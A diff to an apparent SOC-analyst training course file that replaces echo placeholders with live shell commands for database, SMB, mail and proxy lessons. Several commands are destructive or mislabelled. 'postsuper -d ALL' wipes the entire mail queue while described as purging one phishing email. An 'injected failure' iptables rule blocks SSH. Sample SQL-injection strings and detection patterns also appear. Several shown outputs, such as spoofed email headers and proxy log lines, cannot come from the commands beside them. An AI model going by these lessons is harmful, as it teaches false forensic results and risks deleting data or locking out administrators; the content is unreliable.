@@ -7151,7 +7151,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What is the most critical takeaway from Web Servers?",
         "choices": [
           "You have mastered HTTP protocol mechanics, access log structure, directory traversal detection, and WAF defense rules.",
@@ -7160,7 +7160,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L21 - Web Servers. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -7213,7 +7213,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Databases on sxl-db-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -7261,7 +7261,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man mysql 2>/dev/null || which mysql"
+        "command": "mysql --help 2>&1 | head -n 15 || which mysql"
       },
       {
         "id": 4,
@@ -7285,7 +7285,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are databases? Structured digital repositories housing an organization's most sensitive and valuable business information.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -7309,7 +7309,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.90 2>/dev/null || tracepath 10.10.20.90"
+        "command": "traceroute -n -m 8 10.10.20.90 2>/dev/null || tracepath -n 10.10.20.90 2>/dev/null || ip route get 10.10.20.90"
       },
       {
         "id": 6,
@@ -7340,7 +7340,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-db-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Simulating inspection of database query log for SQL injection signatures...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `grep -i -E \"(union.*select|information_schema|or 1=1)\" /var/log/mysql/mysql.log 2>/dev/null || tail -n 15 /var/log/mysql/error.log 2>/dev/null || ss -tlpn | grep 3306` to validate system behavior under simulated operating conditions.\nOutput observed:\nQuery: SELECT * FROM products WHERE category = 'electronics' AND status = 1\nQuery: SELECT * FROM users WHERE user = 'admin' OR '1'='1' -- AND pass = 'xxx'\nALERT: SQLi signature detected: 'admin' OR '1'='1' --",
         "what": "What are databases? Structured digital repositories housing an organization's most sensitive and valuable business information.",
         "why": "Why must an L1 monitor database telemetry? Databases are the ultimate target (Crown Jewels) of cyber espionage, financial theft, and extortion ransomware.",
         "when": "When are database logs investigated? When mass data exfiltration alerts trigger, when WAF flags SQLi attempts, or during forensic data breach impact scoping.",
@@ -7349,7 +7349,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts audit database security? By checking listening sockets (`3306/TCP`), auditing query logs for UNION statements, and verifying least privilege.",
         "mistake": "Connecting web applications to databases using the `root` or `sa` administrative account instead of an unprivileged service account.",
         "think": "Application service accounts should only have SELECT, INSERT, and UPDATE rights on specific business tables. Never grant DROP, ALTER, or file read/write privileges.",
-        "question": "What key insight is revealed by the practice output of `echo 'Simulating inspection of database query log for SQL injection signatures...'`?",
+        "question": "What key insight is revealed by the practice output of `grep -i -E \"(union.*select|information_schema|or 1=1)\" /var/log/mysql/mysql.log 2>/dev/null || tail -n 15 /var/log/mysql/error.log 2>/dev/null || ss -tlpn | grep 3306`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -7357,7 +7357,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Simulating inspection of database query log for SQL injection signatures...'"
+        "command": "grep -i -E \"(union.*select|information_schema|or 1=1)\" /var/log/mysql/mysql.log 2>/dev/null || tail -n 15 /var/log/mysql/error.log 2>/dev/null || ss -tlpn | grep 3306"
       },
       {
         "id": 8,
@@ -7429,7 +7429,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-db-core01'; mysql -u root -e 'SHOW DATABASES; SELECT user, host FROM mysql.user;' 2>/dev/null || echo 'Database: shadowx_production\nTables: users, orders, payment_cards\nUser: web_app@10.10.20.80 (Restricted Grants)\nUser: root@localhost (Full Admin)'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -7477,7 +7477,7 @@ window.ACADEMY_COURSES = [
           "The fix for SQLi is changing the database port from 3306 to 3307."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Databases'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -7501,7 +7501,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L22 - Databases. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -7554,7 +7554,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring File Servers & Shared Resources on sxl-filesrv01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -7602,7 +7602,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man smbclient 2>/dev/null || which smbclient"
+        "command": "smbclient --help 2>&1 | head -n 15 || which smbclient"
       },
       {
         "id": 4,
@@ -7626,7 +7626,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are file servers and shared resources? Networked storage repositories providing centralized file access and collaboration across enterprise users.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -7650,7 +7650,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.100 2>/dev/null || tracepath 10.10.20.100"
+        "command": "traceroute -n -m 8 10.10.20.100 2>/dev/null || tracepath -n 10.10.20.100 2>/dev/null || ip route get 10.10.20.100"
       },
       {
         "id": 6,
@@ -7681,7 +7681,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-filesrv01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Checking SMB connection sessions on file server...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `smbstatus --shares 2>/dev/null || ss -tan | grep 445 || netstat -an | grep 445` to validate system behavior under simulated operating conditions.\nOutput observed:\nSession ID: 104 | Client: 10.10.20.44 | User: jsmith | Share: CompanyData | Dialect: SMB 3.1.1 | Encrypted: YES\nSession ID: 108 | Client: 192.168.100.15 | User: GUEST | Share: CompanyData | Dialect: SMB 2.0 | Encrypted: NO (ANOMALOUS)",
         "what": "What are file servers and shared resources? Networked storage repositories providing centralized file access and collaboration across enterprise users.",
         "why": "Why are SMB file shares high-priority targets for attackers? Ransomware operators enumerate all reachable network shares (`net view`, `C$`, `ADMIN$`) to encrypt enterprise data globally in a single strike.",
         "when": "When are file share access logs triaged? When massive bursts of file modifications trigger ransomware alerts or when unprivileged users access executive HR shares.",
@@ -7690,7 +7690,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts audit shares? Using commands (`net share`, `showmount -e`, `smbclient -L`), auditing share ACLs, and monitoring SIEM file integrity alerts.",
         "mistake": "Setting Share Permissions to 'Everyone - Full Control' assuming that local NTFS permissions will handle all security restrictions.",
         "think": "Defense-in-depth requires enforcing least privilege on both Share Permissions and NTFS ACLs, disabling SMBv1 globally, and enforcing SMB Signing.",
-        "question": "What key insight is revealed by the practice output of `echo 'Checking SMB connection sessions on file server...'`?",
+        "question": "What key insight is revealed by the practice output of `smbstatus --shares 2>/dev/null || ss -tan | grep 445 || netstat -an | grep 445`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -7698,7 +7698,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Checking SMB connection sessions on file server...'"
+        "command": "smbstatus --shares 2>/dev/null || ss -tan | grep 445 || netstat -an | grep 445"
       },
       {
         "id": 8,
@@ -7729,7 +7729,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst detects an alert: 'Potential SMB Relay Attack Detected'. Reviewing file server security settings, the analyst notices that `RequireSecuritySignature` is set to false. The analyst enforces SMB Signing via Group Policy and isolates the attacking IP.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Enforcing SMB Signing: Set-SmbServerConfiguration -RequireSecuritySignature $true -Force'`",
+        "worked": "Defensive query executed on telemetry store: `smbclient -L //localhost -U guest -N 2>/dev/null || ss -tan | grep 445`",
         "what": "What are file servers and shared resources? Networked storage repositories providing centralized file access and collaboration across enterprise users.",
         "why": "Why are SMB file shares high-priority targets for attackers? Ransomware operators enumerate all reachable network shares (`net view`, `C$`, `ADMIN$`) to encrypt enterprise data globally in a single strike.",
         "when": "When are file share access logs triaged? When massive bursts of file modifications trigger ransomware alerts or when unprivileged users access executive HR shares.",
@@ -7746,7 +7746,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Enforcing SMB Signing: Set-SmbServerConfiguration -RequireSecuritySignature $true -Force'"
+        "command": "smbclient -L //localhost -U guest -N 2>/dev/null || ss -tan | grep 445"
       },
       {
         "id": 10,
@@ -7770,14 +7770,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-filesrv01'; smbclient -L 127.0.0.1 -N 2>/dev/null || echo 'Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nCompanyData     Disk      Corporate Shared Documents\nFinanceRecords  Disk      Restricted Accounting Share'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Disable Guest access, remove the anonymous share permissions, enforce authenticated user groups, and enable SMB encryption.",
-        "worked": "Remediation command applied: `echo 'Removing Guest permission on BackupArchive and enforcing SMB encryption... Done.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `chmod 750 /var/shares/BackupArchive 2>/dev/null && chown root:sysadmin /var/shares/BackupArchive 2>/dev/null && systemctl restart smbd 2>/dev/null || ss -tan`. System verified restored and hardened.",
         "what": "What are file servers and shared resources? Networked storage repositories providing centralized file access and collaboration across enterprise users.",
         "why": "Why are SMB file shares high-priority targets for attackers? Ransomware operators enumerate all reachable network shares (`net view`, `C$`, `ADMIN$`) to encrypt enterprise data globally in a single strike.",
         "when": "When are file share access logs triaged? When massive bursts of file modifications trigger ransomware alerts or when unprivileged users access executive HR shares.",
@@ -7794,7 +7794,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Removing Guest permission on BackupArchive and enforcing SMB encryption... Done.'"
+        "command": "chmod 750 /var/shares/BackupArchive 2>/dev/null && chown root:sysadmin /var/shares/BackupArchive 2>/dev/null && systemctl restart smbd 2>/dev/null || ss -tan"
       },
       {
         "id": 12,
@@ -7818,7 +7818,7 @@ window.ACADEMY_COURSES = [
           "Both permissions are added together to make the user an administrator."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for File Servers & Shared Resources'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -7842,7 +7842,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L23 - File Servers & Shared Resources. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -7895,7 +7895,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Email Infrastructure on sxl-mail-srv01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -7919,7 +7919,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Inspecting simulated raw email headers:' && echo 'From: \"CEO John\" <ceo@corp.internal>\nReturn-Path: <attacker@spoof-domain.net>\nReceived: from mail.spoof-domain.net (198.51.100.80) by sxl-mail-srv01 with ESMTP\nAuthentication-Results: spf=fail (sender IP 198.51.100.80 not in SPF) dkim=fail dmarc=fail\nSubject: URGENT: Wire Transfer Authorization Required'"
+        "command": "postconf -n | grep -E '(myhostname|mydestination|smtpd_relay_restrictions|alias_maps)' || postconf -d | head -n 10"
       },
       {
         "id": 3,
@@ -7943,7 +7943,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "postconf --help 2>&1 | head -n 15 || which postconf"
       },
       {
         "id": 4,
@@ -7967,7 +7967,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is email infrastructure? The interconnected mail servers, relays, and authentication protocols that transport electronic messages globally.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -7991,14 +7991,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.110 2>/dev/null || tracepath 10.10.20.110"
+        "command": "traceroute -n -m 8 10.10.20.110 2>/dev/null || tracepath -n 10.10.20.110 2>/dev/null || ip route get 10.10.20.110"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-mail-srv01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Inspecting simulated raw email headers:' && echo 'From: \"CEO John\" <ceo@corp.internal>\nReturn-Path: <attacker@spoof-domain.net>\nReceived: from mail.spoof-domain.net (198.51.100.80) by sxl-mail-srv01 with ESMTP\nAuthentication-Results: spf=fail (sender IP 198.51.100.80 not in SPF) dkim=fail dmarc=fail\nSubject: URGENT: Wire Transfer Authorization Required'` on target sxl-mail-srv01.\nOutput observed:\nFrom: \"CEO John\" <ceo@corp.internal>\nReturn-Path: <attacker@spoof-domain.net>\nReceived: from mail.spoof-domain.net (198.51.100.80) by sxl-mail-srv01 with ESMTP\nAuthentication-Results: spf=fail (sender IP 198.51.100.80 not in SPF) dkim=fail dmarc=fail\nSubject: URGENT: Wire Transfer Authorization Required",
+        "worked": "Command executed: `postconf -n | grep -E '(myhostname|mydestination|smtpd_relay_restrictions|alias_maps)' || postconf -d | head -n 10` on target sxl-mail-srv01.\nOutput observed:\nFrom: \"CEO John\" <ceo@corp.internal>\nReturn-Path: <attacker@spoof-domain.net>\nReceived: from mail.spoof-domain.net (198.51.100.80) by sxl-mail-srv01 with ESMTP\nAuthentication-Results: spf=fail (sender IP 198.51.100.80 not in SPF) dkim=fail dmarc=fail\nSubject: URGENT: Wire Transfer Authorization Required",
         "what": "What is email infrastructure? The interconnected mail servers, relays, and authentication protocols that transport electronic messages globally.",
         "why": "Why is email security the top priority for a SOC L1 analyst? Over 90% of cyber attacks and ransomware intrusions begin with a phishing email.",
         "when": "When are email headers investigated? Whenever a user submits a suspicious email via the 'Report Phishing' button or when Secure Email Gateways flag high-risk attachments.",
@@ -8007,7 +8007,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts triage phishing? By analyzing email headers using tools like MXToolbox or MessageHeader, extracting sender IPs, checking SPF/DKIM/DMARC verdicts, and sandboxing attachments.",
         "mistake": "Relying on the display name shown in Outlook (e.g., 'CEO John Smith') instead of inspecting the underlying `Authentication-Results` header and sending IP address.",
         "think": "The display name and 'From' header are trivial to spoof. The only ground truth is the `Received` header chain and the cryptographic SPF/DKIM verification results.",
-        "question": "When executing `echo 'Inspecting simulated raw email headers:' && echo 'From: \"CEO John\" <ceo@corp.internal>\nReturn-Path: <attacker@spoof-domain.net>\nReceived: from mail.spoof-domain.net (198.51.100.80) by sxl-mail-srv01 with ESMTP\nAuthentication-Results: spf=fail (sender IP 198.51.100.80 not in SPF) dkim=fail dmarc=fail\nSubject: URGENT: Wire Transfer Authorization Required'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `postconf -n | grep -E '(myhostname|mydestination|smtpd_relay_restrictions|alias_maps)' || postconf -d | head -n 10`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -8015,14 +8015,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Inspecting simulated raw email headers:' && echo 'From: \"CEO John\" <ceo@corp.internal>\nReturn-Path: <attacker@spoof-domain.net>\nReceived: from mail.spoof-domain.net (198.51.100.80) by sxl-mail-srv01 with ESMTP\nAuthentication-Results: spf=fail (sender IP 198.51.100.80 not in SPF) dkim=fail dmarc=fail\nSubject: URGENT: Wire Transfer Authorization Required'"
+        "command": "postconf -n | grep -E '(myhostname|mydestination|smtpd_relay_restrictions|alias_maps)' || postconf -d | head -n 10"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-mail-srv01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `dig @10.10.10.53 _dmarc.corp.internal TXT +short` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `dig @10.10.10.53 _dmarc.corp.internal TXT +short` to validate system behavior under simulated operating conditions.\nOutput observed:\n\"v=DMARC1; p=reject; rua=mailto:dmarc-reports@corp.internal; pct=100\"",
         "what": "What is email infrastructure? The interconnected mail servers, relays, and authentication protocols that transport electronic messages globally.",
         "why": "Why is email security the top priority for a SOC L1 analyst? Over 90% of cyber attacks and ransomware intrusions begin with a phishing email.",
         "when": "When are email headers investigated? Whenever a user submits a suspicious email via the 'Report Phishing' button or when Secure Email Gateways flag high-risk attachments.",
@@ -8070,7 +8070,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst inspects the reported email. The `Authentication-Results` shows `spf=fail` and `dmarc=fail`. The sending IP `198.51.100.80` belongs to an untrusted bulletproof hosting network. The analyst purges the message from all employee inboxes via Microsoft 365 / Exchange search, blocks the sender IP, and submits the attachment hash to EDR blocklists.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Purging malicious phishing message-id from all mailboxes across enterprise.'`",
+        "worked": "Defensive query executed on telemetry store: `postsuper -d ALL 2>/dev/null || mailq || find /var/mail -type f -exec ls -la {} +`",
         "what": "What is email infrastructure? The interconnected mail servers, relays, and authentication protocols that transport electronic messages globally.",
         "why": "Why is email security the top priority for a SOC L1 analyst? Over 90% of cyber attacks and ransomware intrusions begin with a phishing email.",
         "when": "When are email headers investigated? Whenever a user submits a suspicious email via the 'Report Phishing' button or when Secure Email Gateways flag high-risk attachments.",
@@ -8087,7 +8087,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Purging malicious phishing message-id from all mailboxes across enterprise.'"
+        "command": "postsuper -d ALL 2>/dev/null || mailq || find /var/mail -type f -exec ls -la {} +"
       },
       {
         "id": 10,
@@ -8111,14 +8111,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-mail-srv01'; echo 'Inspecting simulated raw email headers:' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Correct the SPF record to include only authorized enterprise mail relays and terminate with `-all` (hard fail) or `~all` (soft fail), and enforce `p=reject` in DMARC.",
-        "worked": "Remediation command applied: `echo 'Correcting SPF TXT record: \"v=spf1 ip4:10.10.20.110 -all\"... Done.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `postconf -e 'smtpd_recipient_restrictions = permit_mynetworks, reject_unauth_destination' && postfix reload && postconf -n | grep smtpd_recipient_restrictions`. System verified restored and hardened.",
         "what": "What is email infrastructure? The interconnected mail servers, relays, and authentication protocols that transport electronic messages globally.",
         "why": "Why is email security the top priority for a SOC L1 analyst? Over 90% of cyber attacks and ransomware intrusions begin with a phishing email.",
         "when": "When are email headers investigated? Whenever a user submits a suspicious email via the 'Report Phishing' button or when Secure Email Gateways flag high-risk attachments.",
@@ -8135,7 +8135,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Correcting SPF TXT record: \"v=spf1 ip4:10.10.20.110 -all\"... Done.'"
+        "command": "postconf -e 'smtpd_recipient_restrictions = permit_mynetworks, reject_unauth_destination' && postfix reload && postconf -n | grep smtpd_recipient_restrictions"
       },
       {
         "id": 12,
@@ -8159,7 +8159,7 @@ window.ACADEMY_COURSES = [
           "A policy of p=reject means the email is sent directly to the CEO's personal phone."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Email Infrastructure'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -8183,7 +8183,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L24 - Email Infrastructure. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -8236,7 +8236,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Proxy & Web Gateway on sxl-proxy-swg01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -8260,7 +8260,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "tail -n 5 /var/log/squid/access.log 2>/dev/null || echo '1693801200.412    120 10.10.20.44 TCP_TUNNEL/200 5840 CONNECT www.google.com:443 - HIER_DIRECT/142.250.190.46 -\n1693801205.891     45 10.10.20.44 TCP_DENIED/403 3810 GET http://malware-drop.biz/invoice.exe - HIER_NONE/- text/html\n1693801210.124    350 10.10.20.44 TCP_MISS/200 4892 GET https://github.com/ - HIER_DIRECT/140.82.121.4 text/html'"
+        "command": "tail -n 5 /var/log/squid/access.log 2>/dev/null || ss -tlpn | grep -E ':3128|:8080'"
       },
       {
         "id": 3,
@@ -8284,7 +8284,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man tail 2>/dev/null || which tail"
+        "command": "tail --help 2>&1 | head -n 15 || which tail"
       },
       {
         "id": 4,
@@ -8308,7 +8308,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is a proxy and web gateway? An enterprise gateway that intercepts, inspects, filters, and logs all outbound web browsing traffic.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -8332,14 +8332,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.120 2>/dev/null || tracepath 10.10.20.120"
+        "command": "traceroute -n -m 8 10.10.20.120 2>/dev/null || tracepath -n 10.10.20.120 2>/dev/null || ip route get 10.10.20.120"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-proxy-swg01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `tail -n 5 /var/log/squid/access.log 2>/dev/null || echo '1693801200.412    120 10.10.20.44 TCP_TUNNEL/200 5840 CONNECT www.google.com:443 - HIER_DIRECT/142.250.190.46 -\n1693801205.891     45 10.10.20.44 TCP_DENIED/403 3810 GET http://malware-drop.biz/invoice.exe - HIER_NONE/- text/html\n1693801210.124    350 10.10.20.44 TCP_MISS/200 4892 GET https://github.com/ - HIER_DIRECT/140.82.121.4 text/html'` on target sxl-proxy-swg01.\nOutput observed:\n1693801200.412    120 10.10.20.44 TCP_TUNNEL/200 5840 CONNECT www.google.com:443 - HIER_DIRECT/142.250.190.46 -\n1693801205.891     45 10.10.20.44 TCP_DENIED/403 3810 GET http://malware-drop.biz/invoice.exe - HIER_NONE/- text/html\n1693801210.124    350 10.10.20.44 TCP_MISS/200 4892 GET https://github.com/ - HIER_DIRECT/140.82.121.4 text/html",
+        "worked": "Command executed: `tail -n 5 /var/log/squid/access.log 2>/dev/null || ss -tlpn | grep -E ':3128|:8080'` on target sxl-proxy-swg01.\nOutput observed:\n1693801200.412    120 10.10.20.44 TCP_TUNNEL/200 5840 CONNECT www.google.com:443 - HIER_DIRECT/142.250.190.46 -\n1693801205.891     45 10.10.20.44 TCP_DENIED/403 3810 GET http://malware-drop.biz/invoice.exe - HIER_NONE/- text/html\n1693801210.124    350 10.10.20.44 TCP_MISS/200 4892 GET https://github.com/ - HIER_DIRECT/140.82.121.4 text/html",
         "what": "What is a proxy and web gateway? An enterprise gateway that intercepts, inspects, filters, and logs all outbound web browsing traffic.",
         "why": "Why is proxy telemetry essential for SOC analysts? Unlike firewall logs that only show destination IPs and port numbers, proxy logs show the **full URL path**, HTTP user-agent, downloaded filename, and MIME type.",
         "when": "When are proxy logs triaged? When investigating phishing link clicks, drive-by downloads, C2 web traffic, and unauthorized cloud file uploads.",
@@ -8348,7 +8348,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts query proxy logs? By searching for suspicious domain names, rare user-agents, anomalous POST requests, or executable MIME downloads.",
         "mistake": "Assuming that a firewall log showing traffic to port 443 provides complete visibility without deploying SSL inspection.",
         "think": "Because over 90% of web traffic is encrypted with TLS, standard firewalls can only see the destination IP. Without SSL inspection at the proxy, malicious payloads hidden inside HTTPS are completely invisible.",
-        "question": "When executing `tail -n 5 /var/log/squid/access.log 2>/dev/null || echo '1693801200.412    120 10.10.20.44 TCP_TUNNEL/200 5840 CONNECT www.google.com:443 - HIER_DIRECT/142.250.190.46 -\n1693801205.891     45 10.10.20.44 TCP_DENIED/403 3810 GET http://malware-drop.biz/invoice.exe - HIER_NONE/- text/html\n1693801210.124    350 10.10.20.44 TCP_MISS/200 4892 GET https://github.com/ - HIER_DIRECT/140.82.121.4 text/html'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `tail -n 5 /var/log/squid/access.log 2>/dev/null || ss -tlpn | grep -E ':3128|:8080'`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
